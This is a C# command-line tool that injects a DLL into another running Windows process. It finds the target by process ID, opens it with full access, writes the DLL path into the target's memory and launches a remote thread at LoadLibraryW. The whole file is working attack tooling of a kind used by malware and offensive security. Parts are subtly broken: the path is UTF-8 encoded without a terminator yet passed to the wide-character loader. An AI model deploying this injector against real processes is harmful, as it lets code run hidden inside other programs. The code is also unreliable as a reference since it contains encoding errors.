using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.Runtime.ConstrainedExecution;
using System.Security;
using System.Text;
using System.Formats.Asn1;
using System.Runtime.ExceptionServices;

namespace DLLInjection
{
    class Program
    {
        static void error(string functionName)
        {
            Console.WriteLine($"[-] {functionName} Failed With Error : {Marshal.GetLastWin32Error()}");
        }

        static void log(string logText)
        {
            Console.WriteLine($"[+] {logText}");
        }

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr CreateToolhelp32Snapshot([In] UInt32 dwFlags, [In] UInt32 th32ProcessID);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto)]
        static extern bool Process32First([In] IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true, CharSet = CharSet.Unicode)]
        static extern bool Process32Next([In] IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CloseHandle([In] IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess,
           IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
           IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr GetModuleHandle([MarshalAs(UnmanagedType.LPWStr)] string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [Flags]
        private enum SnapshotFlags : uint
        {
            HeapList = 0x00000001,
            Process = 0x00000002,
            Thread = 0x00000004,
            Module = 0x00000008,
            Module32 = 0x00000010,
            Inherit = 0x80000000,
            All = 0x0000001F,
            NoHeaps = 0x40000000
        }
        //inner struct used only internally
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct PROCESSENTRY32
        {
            const int MAX_PATH = 260;
            internal UInt32 dwSize;
            internal UInt32 cntUsage;
            internal UInt32 th32ProcessID;
            internal IntPtr th32DefaultHeapID;
            internal UInt32 th32ModuleID;
            internal UInt32 cntThreads;
            internal UInt32 th32ParentProcessID;
            internal Int32 pcPriClassBase;
            internal UInt32 dwFlags;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = MAX_PATH)]
            internal string szExeFile;
        }
        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }

        public static bool GetProcessHandle(string ProcessId, out IntPtr hProcess, out UInt32 dwProcessId)
        {
            hProcess = IntPtr.Zero;
            dwProcessId = 0;
            IntPtr hSnap = IntPtr.Zero;
            PROCESSENTRY32 pe32 = new PROCESSENTRY32();
            pe32.dwSize = (UInt32)Marshal.SizeOf(typeof(PROCESSENTRY32));

            hSnap = CreateToolhelp32Snapshot(0x00000002, 0);
            log("Took snapshot");

            if (!Process32First(hSnap, ref pe32))
            {
                error("Process32First");
                CloseHandle(hSnap);
                return false;
            }
            log("Checked first process");

            do
            {
                if (int.Parse(ProcessId) == pe32.th32ProcessID)
                {
                    dwProcessId = pe32.th32ProcessID;
                    hProcess = OpenProcess(0x1F0FFF, false, pe32.th32ProcessID);
                    
                    if (hProcess == IntPtr.Zero)
                    {
                        error("OpenProcess");
                        CloseHandle(hSnap);
                        hProcess = IntPtr.Zero;
                        dwProcessId = 0;
                        return false;
                    }
                    break;
                }

            } while (Process32Next(hSnap, ref pe32));

            if (hSnap != IntPtr.Zero)
            {
                CloseHandle(hSnap);
            }

            if (hProcess == IntPtr.Zero || dwProcessId == 0)
            {
                return false;
            }

            return true;
        }

        public static bool RemoteInjection(string DLLPath, IntPtr hProcess)
        {
            UInt32 sSize = (UInt32)Encoding.UTF8.GetBytes(DLLPath).Length;
            IntPtr dwNumofBytesWritten = IntPtr.Zero;

            IntPtr pLoadLibraryW = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryW");
            if (pLoadLibraryW == IntPtr.Zero)
            {
                error("GetProcAddress");
                error("GetModuleHandle");
                return false;
            }
            Console.WriteLine(pLoadLibraryW); 
            log("LoadLibraryW found");

            IntPtr pPayload = VirtualAllocEx(hProcess, IntPtr.Zero, sSize, (UInt32)AllocationType.Commit | (UInt32)AllocationType.Reserve, (UInt32)MemoryProtection.ExecuteRead);
            if (pPayload == IntPtr.Zero)
            {
                error("VirtualAllocEx");
                return false;
            }
            log("Allocated space for payload");

            byte[] bytes = Encoding.UTF8.GetBytes(DLLPath);
            if (!WriteProcessMemory(hProcess, pPayload, bytes, (int)sSize, out dwNumofBytesWritten))
            {
                error("WriteProcessMemory");
                return false;
            }
            log("Wrote DLL");

            IntPtr lpThreadId = IntPtr.Zero;
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, pLoadLibraryW, pPayload, 0, out lpThreadId);
            if (hThread == IntPtr.Zero)
            {
                error("CreateRemoteThread");
                return false;
            }
            WaitForSingleObject(hThread, 0xFFFFFF);
            log("Executed thread, message box appears");

            CloseHandle(hProcess);
            return true;
        }
        public static void Main(string[] args)
        {
            IntPtr hProcess = IntPtr.Zero;
            UInt32 dwProcessId = 0;

            if (args.Length < 2)
            {
                log("Usage: .\\Inject.exe <Full path to DLL> <PID of process to inject to>");
                return;
            }

            log("Getting handle to process...");
            if (!GetProcessHandle(args[1], out hProcess, out dwProcessId))
            {
                Console.WriteLine("[-] Could not find process");
                return;
            }
            log("Found process handle");

            if (!RemoteInjection(args[0], hProcess))
            {
                Console.WriteLine("[-] Could not inject DLL");
                return;
            }
            log("Message box should appear");

            CloseHandle(hProcess);
            log("Closed handle");
        }
    }
}